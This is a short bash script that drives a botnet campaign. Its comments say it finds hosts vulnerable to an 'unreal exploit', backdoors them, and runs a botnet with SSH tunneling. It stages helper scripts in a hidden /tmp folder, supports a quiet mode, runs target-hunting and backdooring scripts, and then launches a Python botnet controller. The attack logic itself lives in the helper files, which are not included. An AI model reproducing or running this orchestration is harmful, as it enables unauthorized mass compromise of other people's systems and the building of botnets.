#!/bin/bash

#This file finds targets vulnerable to the unreal exploit
#Proceeds to backdoor them, and runs the botnet

#NOTE: Run as root

FOLDER=/tmp/.attack-files
QUIET=0

if [ "$1" == "-q" ]; then
	QUIET=1
fi

if [ ! -d $FOLDER ]; then
	mkdir $FOLDER
fi

if [ ! -s $FOLDER/target_hunter.sh ]; then
	if [ $QUIET -eq 0 ]; then
		echo Please place target_hunter.sh in $FOLDER
	fi
	exit -1
fi

if [ ! -s $FOLDER/target_ballista.sh ]; then
	if [ $QUIET -eq 0 ]; then
		echo Please place target_ballista.sh in $FOLDER
	fi
	exit -1
fi

chmod 700 $FOLDER/*.sh


#Runs IP Gathering and Backoors Targets
if [ $QUIET -eq 1 ]; then
	$FOLDER/target_hunter.sh -q; $FOLDER/target_ballista.sh -q
else	
	$FOLDER/target_hunter.sh; $FOLDER/target_ballista.sh
fi


#Runs SSH Tunneling/Botnet
python2.7 main.py
